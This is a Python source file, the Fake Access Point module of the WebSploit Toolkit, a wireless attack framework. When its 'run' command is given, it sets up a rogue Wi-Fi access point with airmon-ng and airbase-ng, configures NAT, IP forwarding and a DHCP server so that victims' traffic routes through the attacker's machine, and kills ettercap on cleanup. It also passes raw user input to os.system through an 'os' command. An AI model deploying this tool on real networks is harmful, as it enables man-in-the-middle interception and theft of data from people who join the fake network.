#!/usr/bin/env python
#
# WebSploit Toolkit Fake Access Point module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

from time import sleep
from core import wcolors
from core import help
import os
options = ["wlan0", "FakeAP", "11"]
def fake_sts():
		print(wcolors.color.RED + "[!]Notice : You Should Be Installed DHCP Before Run This Attack, If DHCP Not Installed Run This Command in Terminal :")
		print("sudo apt-get install dhcp3-server" + wcolors.color.ENDC)
		fake_ap()
def fake_ap():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Fake AP" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] =='set interface':
			options[0] = com[14:20]
			print "INTERFACE => ", options[0]
			fake_ap()
		elif com[0:9] =='set essid':
			options[1] = com[10:]
			print "ESSID => ", options[1]
			fake_ap()
		elif com[0:11] =='set channel':
			options[2] = com[12:14]
			print "CHANNEL => ", options[2]
			fake_ap()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t\t RQ\t Description"
			print "---------\t--------------\t\t\t----\t--------------"
			print "Interface\t"+options[0]+"\t\t\t\tyes\tWireless Interface Name"
			print "ESSID\t\t"+options[1]+"\t\t\t\tyes\tESSID Name For Fake AP"
			print "Channel\t\t"+options[2]+"\t\t\t\tyes\tChannel Number"
			print ""
			fake_ap()
		elif com[0:2] =='os':
			os.system(com[3:])
			fake_ap()
		elif com[0:4] =='help':
			help.help()
			fake_ap()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			print(wcolors.color.BLUE + "[*]Configure Fake Access Point ..." + wcolors.color.ENDC)
			exec_1 = "xterm -e airmon-ng start " + options[0] + " &"
			os.system(exec_1)
			exec_2 = "xterm -e airbase-ng -e " + options[1] + " -c " + options[2] + " -v " + options[0] + " &"
			os.system(exec_2)
			print(wcolors.color.BLUE + "[*]Configure iptable ..." + wcolors.color.ENDC)
			os.system("xterm -e ifconfig at0 up &")
			os.system("xterm -e ifconfig at0 10.0.0.254 netmask 255.255.255.0 &")
			os.system("xterm -e route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254 &")
			sleep(2)
			os.system("xterm -e iptables --flush &")
			os.system("xterm -e iptables --table nat --flush &")
			os.system("xterm -e iptables --delete-chain &")
			os.system("xterm -e iptables --table nat --delete-chain &")
			os.system("xterm -e iptables -P FORWARD ACCEPT &")
			sleep(2)
			os.system("xterm -e iptables -t nat -A POSTROUTING -o eth3 -j MASQUERADE &")
			print(wcolors.color.BLUE + "[*]Clearing HDCP Leases ..." + wcolors.color.ENDC)
			os.system("xterm -e echo > /var/lib/dhcp3/dhcpd.leases &")
			os.system("xterm -e ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid &")
			print(wcolors.color.BLUE + "[*]Enable IP Forwarding ..." + wcolors.color.ENDC)
			os.system("xterm -e echo 1 > /proc/sys/net/ipv4/ip_forward &")
			sleep(2)
			print(wcolors.color.BLUE + "[*]Starting DHCP Server ..." + wcolors.color.ENDC)
			os.system("xterm -e dhcpd3 -d -f -cf /modules/fakeap/dhcpd.conf at0 &")
			print(wcolors.color.GREEN + "[*]Create Fake Access Point Successful ..." + wcolors.color.ENDC)
			print(wcolors.color.RED + "NOTICE : When You Have Finished Attack, Press [enter] Key For Clean Up" + wcolors.color.YELLOW + " [Important]" + wcolors.color.ENDC)
			enter_key = raw_input()
			os.system('killall xterm')
			os.system('killall ettercap')
			os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')
			os.system('iptables --flush')
			os.system('iptables --table nat --flush')
			os.system('iptables --delete-chain')
			os.system('iptables --table nat --delete-chain')
		else:
			print "Wrong Command => ", com
			fake_ap()
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Clean Up ..." + wcolors.color.ENDC)
		os.system('killall xterm')
		os.system('killall ettercap')
		os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')
		os.system('iptables --flush')
		os.system('iptables --table nat --flush')
		os.system('iptables --delete-chain')
		os.system('iptables --table nat --delete-chain')
